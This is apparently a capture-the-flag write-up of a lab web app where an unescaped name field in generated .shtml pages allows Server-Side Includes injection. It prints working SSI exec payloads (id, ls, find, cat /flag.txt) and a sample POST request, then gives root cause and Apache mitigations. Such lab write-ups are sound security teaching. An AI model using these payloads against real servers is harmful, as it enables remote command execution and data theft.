---
title: "Server-Side Includes Injection Leads to Remote Code Execution | Tockerry"
date: 2026-07-26 14:00:00 +0530
categories: [A05 - Injection, Server-Side Includes Injection]
tags: [ssi-injection, remote-code-execution, command-injection, apache, shtml, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/tockerry-ssi-injection.webp
  alt: Tockerry Server-Side Includes Injection
---

## Lab Link

[Tockerry](https://dashboard.webverselabs-pro.com/mystery-challenges/tockerry)

## Overview

Tockerry was an old-style notice-board application that allowed users to create public posts. Each submitted notice was written to a generated `.shtml` page.

The application escaped user input in the notice title and message fields. However, the author name was inserted into the generated page without equivalent sanitization. Because Apache Server-Side Includes were enabled for `.shtml` files, SSI directives submitted through the name field were interpreted by the web server.

This allowed an attacker to move from harmless SSI variable expansion to arbitrary operating-system command execution and ultimately read the flag file.

## Objective

The objective was to identify a vulnerability in the notice-board application and retrieve the challenge flag.

## Vulnerability Identification

The application exposed a form that accepted three user-controlled values:

- Title
- Message
- Name

Submitted notices were stored as files under the `/notices/` directory and served with the `.shtml` extension.

The `.shtml` extension was significant because Apache commonly processes Server-Side Includes inside these files when the `Includes` option is enabled.

A harmless SSI payload was first placed in the message field:

```html
<!--#echo var="DATE_LOCAL" -->
```

The resulting notice displayed the payload as escaped text, showing that the message field was protected.

Testing the same technique in the name field produced a different result. The SSI directive was evaluated by Apache, confirming that the field was inserted into the generated `.shtml` document without safe output encoding.

## Reconnaissance and Approach

The initial reconnaissance focused on identifying how notices were created and rendered.

The main observations were:

1. The application generated individual `.shtml` notice pages.
2. User input was written into those files.
3. The title and message fields were HTML-escaped.
4. The name field was processed differently.
5. Apache SSI directives executed when submitted through the name field.

A harmless date-expansion directive was used first to verify SSI interpretation without executing operating-system commands:

```html
Codex <!--#echo var="DATE_LOCAL" -->
```

When the generated notice was opened, Apache replaced the directive with the server's local date.

This confirmed Server-Side Includes injection.

## Exploitation

### Confirming SSI Environment Access

The following payload was submitted through the vulnerable name field:

```html
Codex <!--#printenv -->
```

The generated notice displayed Apache and request environment variables.

Although the flag was not stored in the environment, this proved that SSI directives were executing in the server context.

### Confirming Command Execution

The next test used the SSI `exec` directive:

```html
Codex <!--#exec cmd="id" -->
```

The command output appeared inside the generated notice page, confirming arbitrary command execution as the web-server user.

The vulnerable request followed this structure:

```http
POST /post.php HTTP/1.1
Host: [REDACTED]
Content-Type: application/x-www-form-urlencoded

title=Command+Test&
message=Testing+SSI+execution&
name=Codex+%3C%21--%23exec+cmd%3D%22id%22+--%3E
```

The server created a new `.shtml` notice and redirected the browser to it. When Apache rendered the page, the injected SSI directive executed.

### Locating the Flag

An initial attempt to read `/flag` returned no useful output, so the filesystem was enumerated using short commands that fit within the input-length restriction.

```html
Codex <!--#exec cmd="ls -la /" -->
```

A targeted search was then used to locate files containing `flag` in their name:

```html
Codex <!--#exec cmd="find / -maxdepth 3 -type f -name '*flag*' 2>/dev/null" -->
```

This identified the flag file at:

```text
/flag.txt
```

### Reading the Flag

The final payload executed `cat` against the discovered file:

```html
Codex <!--#exec cmd="cat /flag.txt" -->
```

Apache executed the command while rendering the generated notice page and inserted the file contents into the author byline.

## Proof / Flag

The challenge flag was successfully retrieved from:

```text
/flag.txt
```

```text
WEBVERSE{REDACTED}
```

## Root Cause

The root cause was inconsistent output handling when user-controlled data was written into generated `.shtml` files.

The application safely escaped the title and message fields but inserted the name field without neutralizing SSI directive syntax.

Because Apache was configured to process Server-Side Includes and allowed the `exec` directive, attacker-controlled input became executable server-side instructions.

The vulnerable data flow was effectively:

```text
User-controlled name
        ↓
Written into generated .shtml file
        ↓
Apache parses SSI directives
        ↓
Operating-system command execution
```

## Impact

This vulnerability resulted in full remote code execution within the privileges of the web-server account.

An attacker could potentially:

- Read application source code and configuration files
- Access credentials and secrets stored on the server
- Read sensitive files accessible to the web-server user
- Modify application content
- Execute arbitrary shell commands
- Use the compromised server as a foothold for further attacks

In this challenge, the vulnerability was used to locate and read `/flag.txt`.

## Mitigation

### Escape Every User-Controlled Field

All user input must be encoded before being inserted into HTML or server-parsed templates. Security controls must be applied consistently to every field, including less obvious values such as display names and author metadata.

### Avoid Generating Executable `.shtml` Files

User-generated content should be stored as data rather than written into server-executable files.

Safer alternatives include:

- Store notice data in a database
- Render content through a trusted template engine
- Serve generated files with a non-executable extension
- Store uploads outside the web root

### Disable SSI Where It Is Not Required

SSI processing should be disabled unless it is explicitly needed.

For Apache, avoid enabling:

```apache
Options Includes
```

Use:

```apache
Options -Includes
```

for directories containing user-controlled content.

### Disable SSI Command Execution

When SSI is required, use the more restrictive configuration:

```apache
Options IncludesNOEXEC
```

This prevents SSI `exec` directives from running shell commands.

### Apply a Strict Content Security Boundary

User-controlled data should never be interpreted as server-side code. Applications should maintain a clear separation between content and executable templates.

### Use Allowlist Validation

Fields such as names can be restricted to expected characters and lengths. Validation should supplement output encoding rather than replace it.

## Lessons Learned

The `.shtml` extension was the key indicator in this challenge. Even though the most obvious fields were escaped, testing each input independently revealed inconsistent handling in the name field.

The exploitation path was:

```text
Generated .shtml notice
        ↓
SSI directive in name field
        ↓
SSI variable expansion
        ↓
Environment disclosure
        ↓
SSI exec directive
        ↓
Remote command execution
        ↓
Locate /flag.txt
        ↓
Read the flag
```

The main lesson is that partial sanitization is not sufficient. A single overlooked field can turn a content-posting feature into remote code execution when the server interprets generated files as executable templates.
